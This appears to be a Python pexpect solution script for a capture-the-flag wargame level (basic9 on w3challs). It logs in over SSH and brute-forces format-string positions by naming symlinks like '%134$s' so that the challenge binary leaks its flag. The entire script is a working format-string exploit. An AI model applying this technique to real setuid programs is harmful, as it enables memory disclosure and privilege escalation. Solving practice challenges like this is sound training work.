#!/usr/bin/env python3

import pexpect

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

print("\n[*] Probando posición 134 directamente (basado en análisis anterior)...")

child.sendline(b"cd /tmp")
child.expect([b'\\$'])

# Probar alrededor de 134
for i in range(130, 140):
    print(f"Posición {i}...")
    
    # Crear el symlink - SIN ESCAPAR EL $
    cmd = b'ln -sf /home/basic9/basic9 \'%' + str(i).encode() + b'$s\''
    child.sendline(cmd)
    child.expect([b'\\$'])
    
    # Ejecutar
    cmd = b'./%' + str(i).encode() + b'$s x 2>&1'
    child.sendline(cmd)
    
    # Esperar output
    index = child.expect([b'\\$', b'W3C{'], timeout=2)
    
    if index == 1:
        # Encontrado!
        child.expect([b'}'], timeout=2)
        output = child.before + b'}'
        
        print(f"\n🔥🔥🔥 FLAG ENCONTRADA EN POSICIÓN {i} 🔥🔥🔥")
        print(f"FLAG: W3C{{{output.decode('utf-8', errors='ignore')}")
        break

child.close()